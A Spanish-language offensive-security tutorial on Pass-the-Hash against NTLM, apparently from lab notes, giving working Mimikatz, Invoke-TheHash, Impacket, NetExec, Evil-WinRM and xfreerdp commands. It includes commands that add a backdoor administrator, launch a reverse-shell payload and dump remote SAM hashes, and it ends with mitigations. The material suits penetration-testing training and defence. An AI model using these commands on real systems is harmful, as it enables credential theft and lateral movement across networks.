# Pass-the-Hash (PtH)

Pass-the-Hash es una técnica de autenticación que explota una característica fundamental de NTLM: el protocolo no requiere que el cliente demuestre conocer la contraseña en texto claro, sino que demuestre poseer el hash NT. Esto significa que un hash NT extraído de SAM, LSASS o NTDS.dit puede usarse directamente para autenticarse en cualquier servicio que acepte NTLM, sin necesidad de cracking previo.

NTLM usa el hash como derivación de la clave de sesión — fue diseñado antes de que este tipo de ataque fuera parte del modelo de amenazas. Las contraseñas almacenadas en servidores y DCs con NTLM no están saladas, lo que hace que el hash sea estático entre sesiones hasta que se cambia la contraseña.

### Requisitos

* Hash NT de la cuenta objetivo — formato `aad3b435b51404eeaad3b435b51404ee:HASH_NT` (la parte LM puede ser el hash vacío o cualquier valor)
* El servicio objetivo debe aceptar autenticación NTLM: SMB, WMI, WinRM, RDP con Restricted Admin Mode
* La cuenta debe tener los permisos necesarios en el destino

> PtH no funciona contra Kerberos. Sigue funcionando en dominios modernos cuando el cliente conecta por IP en lugar de nombre, o cuando el servicio no tiene SPN registrado.

### Desde Windows

#### Mimikatz — sekurlsa::pth

Mimikatz abre un proceso nuevo con el token de seguridad cargado con el hash, sin necesidad de conocer la contraseña. Todos los comandos de red ejecutados desde esa ventana se autentican como el usuario objetivo.

```
privilege::debug
sekurlsa::pth /user:julio /domain:inlanefreight.htb /ntlm:64F12CDDAA88057E06A81B54E73B949B /run:cmd.exe
```

Parámetros:

| Parámetro        | Descripción                                                                     |
| ---------------- | ------------------------------------------------------------------------------- |
| `/user`          | Nombre del usuario a suplantar                                                  |
| `/rc4` o `/ntlm` | Hash NT de la contraseña                                                        |
| `/domain`        | Dominio del usuario. Para cuentas locales: nombre del equipo, `localhost` o `.` |
| `/run`           | Proceso a lanzar con ese contexto (por defecto `cmd.exe`)                       |

Desde la `cmd.exe` resultante se pueden ejecutar comandos de red autenticados como el usuario:

```cmd
dir \\DC01\julio
net use Z: \\DC01\compartido
```

#### Invoke-TheHash (PowerShell)

Colección de funciones PowerShell que realizan PtH via SMB o WMI sin necesitar privilegios de administrador local en el cliente — solo el hash necesita tener derechos en el destino.

```powershell
Import-Module .\Invoke-TheHash.psd1

# SMBExec — crear usuario y añadirlo a administradores
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb `
  -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# WMIExec — ejecutar payload de reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb `
  -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "powershell -e <payload_base64>"
```

### Desde Linux

#### Impacket

Impacket ofrece múltiples herramientas para PtH con diferentes mecanismos de ejecución:

```bash
# psexec — sube ejecutable a ADMIN$, obtiene SYSTEM
impacket-psexec administrator@10.10.10.10 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# Con dominio explícito
impacket-psexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20

# wmiexec — via WMI, no crea servicios, menos ruidoso
impacket-wmiexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20

# smbexec — no sube binarios, más compatible con defensas restrictivas
impacket-smbexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20

# atexec — via Task Scheduler
impacket-atexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20 whoami
```

#### NetExec

```bash
# Verificar hash en toda la subred
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Ejecutar comando con hash válido
netexec smb 10.10.10.10 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

# Sweep con cuenta local (--local-auth) — detecta reutilización de admin local
netexec smb 192.168.1.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth

# Extraer SAM remoto con PtH
netexec smb 192.168.1.20 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --sam

# WinRM
netexec winrm 192.168.1.20 -u jsmith -H 64f12cddaa88057e06a81b54e73b949b
```

El indicador `(Pwn3d!)` confirma que la cuenta tiene privilegios de administrador local en ese host.

#### Evil-WinRM

Alternativa cuando SMB está bloqueado o se prefiere una sesión PowerShell interactiva:

```bash
evil-winrm -i 10.10.10.10 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Con cuenta de dominio — incluir el dominio
evil-winrm -i 10.10.10.10 -u administrator@inlanefreight.htb -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### RDP con Restricted Admin Mode

Por defecto RDP con NLA requiere contraseña en texto claro. Con **Restricted Admin Mode** activo en el destino, se puede conectar usando solo el hash.

```cmd
# Habilitar Restricted Admin Mode en el objetivo (requiere acceso previo)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
# Conectar via RDP con xfreerdp usando hash
xfreerdp /v:192.168.1.20 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /d:EMPRESA
```

Si Restricted Admin Mode no está habilitado, xfreerdp devuelve un error de restricción de cuenta.

### Movimiento horizontal masivo — admin local reutilizado

El escenario más frecuente y destructivo: la misma imagen de despliegue deja el mismo hash de administrador local en decenas o cientos de máquinas. Comprometer una permite moverse a toda la flota sin explotar ninguna vulnerabilidad adicional.

```bash
# Detectar todos los hosts donde el hash de admin local es válido
netexec smb 192.168.1.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth --continue-on-success
```

> LAPS (Local Administrator Password Solution) es la contramedida directa — genera contraseñas únicas por host para el administrador local y las rota automáticamente. Si LAPS está desplegado correctamente, este vector queda bloqueado.

### Limitaciones de UAC para cuentas locales

UAC restringe la capacidad de cuentas locales no-RID500 para operaciones de administración remota. Por defecto, solo la cuenta `Administrator` (RID-500) puede hacer PtH remoto. Las demás cuentas del grupo Administrators locales están bloqueadas salvo que se configure:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1
```

Las cuentas de dominio con privilegios administrativos no están sujetas a esta restricción — PtH con una cuenta de dominio DA funciona independientemente de UAC.

### Resumen de herramientas

| Herramienta              | Plataforma | Protocolo | Característica                     |
| ------------------------ | ---------- | --------- | ---------------------------------- |
| `mimikatz sekurlsa::pth` | Windows    | NTLM      | Abre proceso con token del hash    |
| `Invoke-TheHash`         | Windows    | SMB / WMI | No requiere admin local en cliente |
| `impacket-psexec`        | Linux      | SMB       | Obtiene SYSTEM, sube ejecutable    |
| `impacket-wmiexec`       | Linux      | WMI       | Sin servicios, semi-interactivo    |
| `impacket-smbexec`       | Linux      | SMB       | Sin binarios en disco              |
| `netexec`                | Linux      | SMB/WinRM | Sweep masivo, módulos extra        |
| `evil-winrm`             | Linux      | WinRM     | Sesión PowerShell interactiva      |
| `xfreerdp /pth`          | Linux      | RDP       | Acceso gráfico                     |

### Mitigaciones

| Mitigación                  | Efecto                                                     |
| --------------------------- | ---------------------------------------------------------- |
| **Credential Guard**        | Hashes NTLM no accesibles en LSASS                         |
| **LAPS**                    | Contraseñas de admin local únicas por host                 |
| **Protected Users group**   | Fuerza Kerberos, deshabilita NTLM para los miembros        |
| **SMB signing obligatorio** | No mitiga PtH pero bloquea NTLMRelay                       |
| **Deshabilitar NTLM**       | Elimina el vector, pero puede romper compatibilidad legacy |
